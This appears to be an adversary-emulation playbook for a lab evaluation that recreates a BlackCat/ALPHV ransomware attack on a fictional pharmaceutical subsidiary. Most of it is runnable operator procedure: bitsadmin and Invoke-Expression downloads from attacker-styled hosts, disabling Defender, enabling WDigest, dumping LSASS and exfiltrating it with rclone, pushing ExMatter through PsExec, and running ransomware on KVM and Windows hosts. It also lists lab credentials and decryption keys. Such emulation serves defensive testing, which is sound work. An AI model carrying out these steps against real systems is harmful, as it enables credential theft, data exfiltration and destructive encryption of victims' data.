# Control Scenario: BlackCat/ALPHV

## 1.1 Attack Chain Overview (7 Steps)

| Step | Name                                          | ATT&CK Tactic(s)                                      | Key Activities                                                                                                          |
| ---- | --------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| 0    | Operator Setup                                | Resource Development                                  | Establish WebDAV server (rclone) for exfiltration, start file server for tool staging (InfoStealer, ExMatter, BlackCat) |
| 1    | Initial Compromise and Discovery              | Initial Access, Discovery                             | RDP via compromised contractor credentials, ADRecon.ps1 for AD/network discovery                                        |
| 2    | Credential Access                             | Credential Access, Defense Evasion                    | InfoStealer against SQL databases, disable AV/EDR via multiple methods                                                  |
| 3    | Credential Access for Privilege Escalation    | Credential Access, Privilege Escalation, Exfiltration | Enable WDigest, LSASS dump via Task Manager, exfiltrate via rclone                                                      |
| 4    | Collection & Exfiltration                     | Discovery, Collection, Exfiltration                   | Network scanning, ExMatter deployment via PsExec for data exfiltration                                                  |
| 5    | Payload Deployment                            | Lateral Movement, Execution, Impact                   | BlackCat Linux ransomware deployment to KVM server via SCP/SSH, VM encryption                                           |
| 6    | Encryption for Impact/Inhibit System Recovery | Execution, Impact, Defense Evasion                    | BlackCat Windows ransomware execution, propagation via PsExec, file encryption, event log clearing                      |

## 2. Target Environment Specification

### 2.1 Overview

The ALPHV BlackCat scenario emulates an attack against a subsidiary of a global pharmaceutical company. The environment consists of:

- **Contractor Network** (external trusted partner with VPN/RDP access)
- **Corporate Subsidiary Network** with multiple segments:
  - User/Workstation segment
  - Server segment (backup infrastructure, domain controllers)
  - Virtualization segment (Linux KVM server hosting VMs)

**Attack Path Summary:**

1. Initial access via compromised contractor credentials -> RDP to bastion host
2. Lateral movement through corporate network using harvested credentials
3. Data exfiltration via ExMatter to external SFTP server
4. Ransomware deployment to Linux KVM server (VM encryption) and Windows hosts

### 2.2 Network Architecture

#### 2.2.1 Network Segments

| Segment                   | CIDR          | Purpose                               |
| ------------------------- | ------------- | ------------------------------------- |
| **Subsidiary - Servers**  | 10.20.10.0/24 | Domain controllers, file/SQL/Exchange |
| **Subsidiary - Desktops** | 10.20.20.0/24 | User workstations                     |
| **Contractor Network**    | 10.30.0.0/16  | Standalone contractor workstation     |

### 2.3 Host Inventory

#### 2.3.1 Host Summary Table

| Hostname      | IP Address   | OS                  | Role                 |
| ------------- | ------------ | ------------------- | -------------------- |
| raremon       | 10.30.10.4   | Windows 11          | Contractor WS        |
| kimeramon     | 10.20.20.11  | Windows 11          | Bastion Workstation  |
| datamon       | 10.20.10.122 | Windows Server 2022 | SQL Server           |
| blacknoirmon  | 10.20.10.4   | Windows Server 2022 | Domain Controller    |
| stormfrontmon | 10.20.10.200 | Windows Server 2022 | Exchange Server      |
| alphamon      | 10.20.10.23  | Windows Server 2022 | File Server          |
| butchermon    | 10.20.20.22  | Windows 11          | Workstation          |
| bakemon       | 10.20.20.33  | Windows 11          | Workstation          |
| leomon        | 10.20.10.16  | Ubuntu 22.04 LTS    | KVM Server           |
| kraken        | 176.59.1.18  | Kali Linux 2023.4   | Attack Platform      |
| homelander    | 116.83.1.29  | Linux               | Verification Jumpbox |

### 2.4 Accounts & Credentials

#### 2.4.1 Domain Accounts

| Account            | Domain      | Type         | Group Memberships                  | Password (Lab Only) |
| ------------------ | ----------- | ------------ | ---------------------------------- | ------------------- |
| zorimoto           | DIGIREVENGE | Domain User  | Domain Users, Remote Desktop Users | tzTVgs44isT4YxWU!   |
| ykaida.da          | DIGIREVENGE | Domain Admin | Domain Admins                      | FWy9aXyXbYrbxFcE!   |
| evals_domain_admin | DIGIREVENGE | Domain Admin | Domain Admins                      | axi9eengei9inaeR@   |

#### 2.4.2 Local Accounts

| Account | Host(s)       | Type                | Password (Lab Only) | Scenario Use                     |
| ------- | ------------- | ------------------- | ------------------- | -------------------------------- |
| windesk | Windows hosts | Local Administrator | windesk             | Disable AV, privilege escalation |

#### 2.4.3 Service/Application Accounts

| Account     | Application      | Type                | Password (Lab Only)                                    | Scenario Use                              |
| ----------- | ---------------- | ------------------- | ------------------------------------------------------ | ----------------------------------------- |
| netbnmadmin | NetBNMBackup SQL | SQL Service Account | [Retrieved via InfoStealer not specified in procedure] | Backup server access                      |
| marakawa    | Linux KVM (sudo) | Linux Admin         | cuL9LmnrdnWqbqcA@                                      | SSH access to KVM server, ransomware exec |

## Section 3: Attack Chain Procedure

| Step | Name                                       | Primary Host(s)               | Objective                                    |
| ---- | ------------------------------------------ | ----------------------------- | -------------------------------------------- |
| 0    | Operator Setup                             | kraken (attack platform)      | Establish adversary infrastructure           |
| 1    | Initial Compromise and Discovery           | raremon -> kimeramon          | Establish foothold, enumerate AD             |
| 2    | Credential Access                          | kimeramon, datamon            | Harvest credentials from SQL database        |
| 3    | Credential Access for Privilege Escalation | kimeramon                     | Enable WDigest, dump LSASS, exfiltrate creds |
| 4    | Collection & Exfiltration                  | kimeramon -> multiple targets | Deploy ExMatter, exfil data via SFTP         |
| 5    | Payload Deployment (Linux)                 | kimeramon -> leomon           | Deploy BlackCat Linux, encrypt VMs           |
| 6    | Encryption for Impact                      | kimeramon -> multiple targets | Deploy BlackCat Windows, encrypt & propagate |

### 3.0 Step 0: Operator Setup

#### 3.0.1 Objective

Prior to initiating the attack, the BlackCat operator establishes the required adversary infrastructure including the WebDAV server for credential exfiltration and the file server for tool staging.

#### 3.0.2 Procedures

##### 1. Initiate RDP to Attack Host

Initiate an RDP session to the Kali attack host:
**Target**: kraken (176.59.1.18)

##### 2. Start WebDAV Server

Open a terminal window and start the WebDAV server using rclone:

```bash
sudo rclone serve webdav /srv/http --addr 176.59.1.18:8080
```

This server will receive exfiltrated credentials (LSASS dump) in Step 3.

##### 3. Start File Server (evalsC2server)

In another terminal window, start the evalsC2server with the simple file server handler:

```bash
cd alphv_blackcat/Resources/control_server
sudo ./controlServer -c config/msr2_handler_config.yml
```

Ensure the following handlers are enabled:

- Simple file server
This server hosts the following attack tools:
- `netbnmp.exe` (InfoStealer)
- `collector1.exe` (ExMatter)
- `digirevenge` (BlackCat Linux)
- `digirevenge.exe` (BlackCat Windows)
- `Empire-port-scan.ps1` (Port scanner)

#### 3.0.3 Adversary Infrastructure Summary

| Service     | Host/Domain                         | Port | Purpose                        |
| ----------- | ----------------------------------- | ---- | ------------------------------ |
| File Server | the-inator.com                      | 80   | Tool downloads via BITSAdmin   |
| WebDAV      | luffaplex-dillpickle-inator.com     | 8080 | rclone credential exfiltration |
| SFTP        | hide-the-secret-password-inator.net | 22   | ExMatter data exfiltration     |

### 3.1 Step 1: Initial Compromise and Discovery

#### 3.1.1 Objective

An Access Broker provides the BlackCat affiliate with compromised contractor credentials, granting RDP access to a bastion host within the corporate network. The affiliate uses ADRecon to enumerate Active Directory and identify high-value targets.

#### 3.1.2 Procedures

##### 1. RDP to Contractor Workstation

From attack platform, initiate RDP session to contractor workstation:
**Target**: raremon (10.30.10.4)

##### 2. RDP to Bastion Host

From raremon, initiate RDP connection to the bastion host using contractor credentials:
**Target**: kimeramon (10.20.20.11)
**Username**: DIGIREVENGE\zorimoto
**Password**: tzTVgs44isT4YxWU!

##### 3. Download ADRecon

Within the RDP session to kimeramon, open Edge and browse to:
<https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1>
Click "Download raw file" to save to Downloads folder.

##### 4. Execute ADRecon

Open non-elevated PowerShell and execute:

```powershell
cd Downloads
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
.\ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV
```

##### 5. Analyze Output

Using File Explorer, browse to ADRecon output directory. Open the following CSV files with LibreOffice:

- `Computers.csv` - Identifies domain-joined systems
- `GroupMembers.csv` - Identifies privileged accounts

### 3.2 Step 2: Credential Access

#### 3.2.1 Objective

The BlackCat affiliate discovers SQL Server Management Studio on the bastion host and downloads InfoStealer to harvest credentials from the local database and the NetBNMBackup server. Retrieved credentials include local admin, Linux admin, and domain admin accounts. The affiliate then disables security controls on the bastion host.

#### 3.2.2 Procedures

##### 1. Open SQL Server Management Studio

Within the RDP session to kimeramon, search for "SQL Server Management Studio".

##### 2. Connect to Local Database

In the "Connect to Server" prompt:
**Authentication**: SQL Server Authentication
**Username**: zorimoto
**Password**: tzTVgs44isT4YxWU!

##### 3. Confirm NetBNMBackup Database

In Object Explorer, expand: `Databases > NetBNMBackup > Tables`
Right-click `dbo.Credentials` -> Select "Select Top 1000 Rows"
Review rows to confirm unencrypted, encoded credential data exists.

##### 4. Download InfoStealer

Open non-elevated cmd.exe as zorimoto:

```cmd
bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
```

##### 5. Execute InfoStealer

Execute the info stealer like the below:

```cmd
%TEMP%\netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!
```

**Expected Output:** Plaintext credentials for SQL service account `netbnmadmin`

##### 6. RDP to SQL Server

From kimeramon, initiate RDP to datamon:
**Target**: datamon (10.20.10.122)
**Username**: DIGIREVENGE\zorimoto
**Password**: tzTVgs44isT4YxWU!

##### 7. Download InfoStealer on datamon

Open non-elevated cmd.exe:

```cmd
bitsadmin /transfer defaultjob /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
```

##### 8. Execute InfoStealer

```cmd
%TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!
```

**Expected Output:** Plaintext credentials for:

- `windesk` (workstation local admin)
- `marakawa` (Linux KVM admin)
- `ykaida.da` (domain admin)

##### 9. Disconnect from datamon

Close all windows and disconnect RDP session. Return to kimeramon session.

##### 10. Terminate AV Processes via Task Manager

Open Task Manager as Administrator:
**Username**: .\windesk
**Password**: windesk

Navigate to "Details" tab and terminate any matching AV/EDR process names.
Navigate to "Services" tab and stop any matching AV/EDR service names.

##### 11. Disable Windows Security Real-time Protection (GUI)

Search for "Virus & threat protection" -> "Manage settings" -> Toggle "Real-time protection" to Off

Provide windesk credentials if prompted.

##### 12. Disable Defender via PowerShell

Open elevated PowerShell (Run as Administrator with windesk credentials):

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 3.3 Step 3: Credential Access for Privilege Escalation

#### 3.3.1 Objective

Using local admin credentials, the BlackCat affiliate enables WDigest credential caching, dumps LSASS memory via Task Manager, and exfiltrates the dump file using rclone over WebDAV.

#### 3.3.2 Procedures

##### 1. Open Registry Editor as Administrator

Search for "Registry Editor", right-click -> Run as Administrator:
**Username**: .\windesk
**Password**: windesk

##### 2. Create WDigest Registry Key

Navigate to:

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```

Right-click -> New -> DWORD (32-bit) Value:

```
Name: UseLogonCredential
Type: REG_DWORD
Value: 1
```

##### 3. Open Task Manager as Administrator

If not already open, search for Task Manager -> Run as Administrator (windesk credentials).

##### 4. Create LSASS Dump

Navigate to "Details" tab -> Find `lsass.exe` -> Right-click -> "Create dump file"
**Dump File Location:** `C:\Users\windesk\AppData\Local\Temp\lsass.DMP`

##### 5. Download rclone

Within RDP session to kimeramon, open Edge and browse to:

```
https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip
```

##### 6. Extract rclone

In Downloads folder, right-click the zip -> "Extract all..." -> Extract

##### 7. Configure rclone for WebDAV

Open elevated cmd.exe (Run as Administrator with windesk credentials):

```cmd
cd C:\Users\zorimoto\Downloads\rclone-v1.64.0-windows-amd64\rclone-v1.64.0-windows-amd64
rclone config
```

Configuration prompts:

```
n (New remote)
name: webdav
type: 49 (WebDAV)
url: http://luffaplex-dillpickle-inator.com:8080
vendor: 6 (Other)
user: (blank - press Enter)
password: (blank - press Enter)
bearer_token: (blank - press Enter)
Edit advanced config: no
Keep this "webdav" remote: yes
q (Quit config)
```

##### 8. Exfiltrate LSASS Dump

```cmd
rclone copy "C:\Users\windesk\AppData\Local\Temp\lsass.DMP" webdav:
```

#### 3.3.3 Verification Procedures

##### 1. Return to the Kali Machine

Switch back to kraken

##### 2. Verify Exfiltration of LSASS Dump

```shell
sudo ls -l /srv/http
```

### 3.4 Step 4: Collection & Exfiltration

#### 3.4.1 Objective

The BlackCat affiliate downloads ExMatter and a network scanning script, identifies additional targets, and deploys ExMatter via PsExec to collect and exfiltrate data from multiple hosts to an SFTP server.

#### 3.4.2 Procedures

##### 1. Download ExMatter

Open cmd.exe as zorimoto:

```
bitsadmin /transfer defaultjob4 /download http://theinator.com/digirevenge/collector1.exe %TEMP%\collector1.exe
```

##### 2. Open Elevated PowerShell

Search for PowerShell -> Run as Administrator:
**Username**: DIGIREVENGE\ykaida.da
**Password**: FWy9aXyXbYrbxFcE!

##### 3. Download and Execute Port Scanner

```powershell
Invoke-Expression(Invoke-WebRequest 'http://theinator.com/digirevenge/Empire-port-scan.ps1' -UseBasicParsing)

Invoke-Portscan -Hosts "10.20.20.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}

Invoke-Portscan -Hosts "10.20.10.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}
```

##### 4. Execute ExMatter via PsExec

From elevated PowerShell:

```powershell
psexec -c -accepteula \\10.20.20.22,10.20.20.33,10.20.10.4,10.20.10.23,10.20.10.122,10.20.10.200 C:\Users\zorimoto\AppData\Local\Temp\collector1.exe
```

##### 5. Run ExMatter on Bastion Host

Using File Explorer, browse to `C:\Users\zorimoto\AppData\Local\Temp`

Right-click `collector1.exe` -> Run as Administrator:
**Username**: DIGIREVENGE\ykaida.da
**Password**: FWy9aXyXbYrbxFcE!

**Log File Location:** `C:\Users\zorimoto\AppData\Local\Temp\EMlog.txt`

#### 3.4.3 Verification Procedures

##### 1. Return to the Kali Machine

Switch back to kraken

##### 2. Verify SFTP Uploads

Check the SFTP server for uploaded ZIP archives from each target host:

```bash
sudo ls -alR /srv/sftp/sftpupload/uploads/
```

**Expected output**: ZIP archives named with hostnames (e.g., `butchermon.zip`, `bakemon.zip`, etc.)

**NOTE:** If there are any mussing ZIP archives in this directory do the below, otherwise continue to the next step in the scenario.

##### 3.4.7 Alternate Steps

##### 1. Return to the Jumpbox

Return to the homelander RDP session and from there RDP into the subsidiary B domain controller blacknoirmon
**Username**: digirevenge\evals_domain_admin
**Password**: axi9eengei9inaeR@

##### 2. Fetch ExMatter Logs from Target Hosts

Using PowerShell from homelander, retrieve ExMatter logs from each target:

```powershell
$paths = @(
    "C$\Windows\System32\EMBatLog.txt",
    "C$\Windows\EMBatLog.txt",
    "C$\Windows\System32\EMlog.txt",
    "C$\Windows\EMlog.txt"
)

$destDir = "C:\Users\evals_domain_admin\xelogs"
$zipPath = "C:\Users\evals_domain_admin\xelogs.zip"

mkdir $destDir -Force | Out-Null

$hosts = @(
    "alphamon",
    "bakemon",
    "blacknoirmon",
    "butchermon",
    "datamon",
    "kimeramon",
    "stormfrontmon"
)

foreach ($targhost in $hosts) {
    $logFile = $paths |
        ForEach-Object {
            $candidatePath = "\\$targhost\$_"
            if (Test-Path $candidatePath) {
                Write-Host "[DEBUG] Found log file $candidatePath on $targhost"
                Get-ChildItem -Path $candidatePath
            }
        } |
        Sort-Object -Property LastWriteTime -Descending |
        Select-Object -First 1

    if ($logFile) {
        Write-Host "[INFO] Fetching most recent log file $($logFile.FullName) on $targhost"

        if ($logFile.FullName -match "EMBatLog.txt") {
            Copy-Item $logFile.FullName "$destDir\dec_$targhost.log" -Force
        } else {
            Copy-Item $logFile.FullName "$destDir\enc_$targhost.log" -Force
        }
    } else {
        Write-Host "[ERROR] Failed to find log files on $targhost"
    }
}

Compress-Archive -Path $destDir -DestinationPath $zipPath -Force

scp "$zipPath" op1@176.59.1.18:/tmp/xelogs.zip

Remove-Item -Recurse -Force $destDir
Remove-Item -Force $zipPath

```

##### 3. Return to the Kali Machine

Switch back to kraken.

##### 4. Decrypt the Uploaded Log Files

```shell
cd

dirname="exmatter_logs_$(date '+%Y-%m-%dT%H-%M-%S')"
mkdir "$dirname"
cd "$dirname"

mv /tmp/xelogs.zip ./
unzip xelogs.zip

cd xelogs

for filename in enc_*.log; do
    basename=${filename#"enc_"}
    python3 alphv_blackcat/Resources/log_decryptor/aes_base64__log_decryptor.py \
        -i "$filename" \
        -o "dec_$basename" \
        -k 0370dd5addcd980e8f4b424c92d8049e99c7c7c5d09eedfcc58f6abca9e72f99 \
        --aes-2
done
```

##### 5. Cross-reference Missing Archives with Log Files

For each of the hosts that were missing zip uploads, check the corresponding decrypted log file to look for errors or signs of unsuccessful/incomplete execution.

```shell
grep -i 'error\|fail' dec_*.log
```

**NOTE**: For hosts that had failed uploads but no matches from the grep command, you may need to manually review the log files for failure.

### 3.5 Step 5: Payload Deployment

#### 3.5.1 Objective

The BlackCat affiliate downloads BlackCat (Linux) to the bastion host, transfers it to the Linux KVM server via SCP, and executes it via SSH. BlackCat Linux encrypts virtual machine volumes on the KVM server.

#### 3.5.2 Procedures

##### 1. Connect to the KVM Server

Initiate an RDP session to homelander and ssh into the KVM server from there.
**Username**: marakawa
**Password**: cuL9LmnrdnWqbqcA@

##### 2. Emulate Legitimate User Activity

Execute the following to emulate legitimate user activity.

```shell
sudo virsh list --all

sudo virsh snapshot-list fedora2
sudo virsh snapshot-list test1
sudo virsh snapshot-list test2

sudo virsh snapshot-create-as fedora2 debugsnapshot --
description "debug snapshot"
sudo virsh snapshot-create-as test1 debugsnapshot --
description "debug snapshot"
sudo virsh snapshot-create-as test2 debugsnapshot --
description "debug snapshot"

sudo virsh snapshot-list fedora2
sudo virsh snapshot-list test1
sudo virsh snapshot-list test2

sudo virsh start fedora2
sudo virsh start test1
sudo virsh start test2

sudo virsh list

exit
```

The above commands list VM's, list current snapshots, create new snapshots, enumerate snapshots, start VM's, and check VM states, all things a normal user might do.

##### 1. Download BlackCat (Linux)

Open cmd.exe as zorimoto:

```cmd
bitsadmin /transfer defaultjob5 /download http://theinator.com/digirevenge/digirevenge %TEMP%\digirevenge
```

##### 2. SCP BlackCat to KVM Server

Open PowerShell (non-elevated):

```powershell
scp $Env:temp\digirevenge marakawa@10.20.10.16:/tmp/digirevenge
```

**Password**: `cuL9LmnrdnWqbqcA@`

##### 3. Execute via SSH

```powershell
ssh -t marakawa@10.20.10.16 "chmod +x /tmp/digirevenge && sudo /tmp/digirevenge --access-token 15742aa362a84ba3"
```

**Password**: `cuL9LmnrdnWqbqcA@`

#### 3.5.3 Verification Procedures

##### 1. Return to the Kali Machine

Switch back to kraken.

##### 2. Retrieve BlackCat (Linux) Logs

```shell
cd
scp evals_domain_admin@10.20.10.16:/home/marakawa/bc.log
~/kvm.log
```

**Password**: axi9eengei9inaeR@

##### 3. Decrypt and Inspect Logs

```shell
python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py \
  -i ~/kvm.log \
  -o ~/dec_kvm.log \
  --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9

cat ~/dec_kvm.log
```

Ensure that the logs show evidence of successful encryption activity and VM tampering.

### 3.6 Step 6: Encryption for Impact/Inhibit System Discovery

#### 3.6.1 Objective

The BlackCat affiliate downloads BlackCat (Windows) to the bastion host and executes it with domain admin credentials.

#### 3.6.2 Procedures

##### 1. Download BlackCat (Windows)

Open cmd.exe as zorimoto:

```cmd
bitsadmin /transfer defaultjob6 /download http://theinator.com/digirevenge/digirevenge.exe %TEMP%\digirevenge.exe
```

##### 2. Open Elevated Command Prompt

Search for cmd.exe -> Run as Administrator:
**Username**: DIGIREVENGE\ykaida.da
**Password**: FWy9aXyXbYrbxFcE!

##### 3. Execute BlackCat (Windows)

```cmd
C:\Users\zorimoto\AppData\Local\Temp\digirevenge.exe --access-token 15742aa362a84ba3
```

#### 3.6.3 Verification Procedures

##### 1. RDP to Verification Jumpbox

If not already connected, initiate RDP session to the verification jumpbox:
**Target**: homelander (116.83.1.29)

##### 2. Fetch BlackCat Windows Logs from Affected Hosts

From the jumpbox RDP into blacknorimon as digirevenge\evals_domain_admin and execute the following script to fetch the BlackCat logs from affected Subsidiary B hosts, zip them up into a single archive, and SCP archive to the Kali server.

```powershell
$path="C$\Windows\System32\clog.xtlog";
$destDir="C:\Users\evalsdomainadmin\sblogs";
$zipPath="C:\Users\evalsdomainadmin\sblogs.zip";
mkdir "$destDir" -force | Out-Null;
$hosts=@("10.20.10.4", "10.20.10.200", "10.20.10.23", "10.20.10.122", "10.20.20.11", "10.20.20.22", "10.20.20.33");
foreach ($targhost in $hosts) {
 $logPath = "\\$targhost\$path"
 if (Test-Path "$logPath") {
  Write-Host "[INFO] Fetching log file on $targhost";
  cp "$logPath" "$destDir\$targhost.log" -Force;
 } else {
  Write-Host "[ERROR] Failed to find log file on $targhost";
 }
}
Compress-Archive -Path "$destDir" -DestinationPath "$zipPath";
scp "$zipPath" op1@176.59.1.18:/tmp/sblogs.zip;
Remove-Item -Recurse -Force "$destDir";
Remove-Item -Force "$zipPath";
```

##### 3. Decrypt BlackCat Windows Logs

Execute the below in kali terminal to get the decrypted logs

```bash
cd
mv /tmp/sblogs.zip ./
unzip sblogs.zip
cd sblogs
for filename in *.log; do
python3
alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i $filename -o dec_$filename --aes-128-ctr -k
4a99bcca87318b844be7928cd98e23f9;
done
```
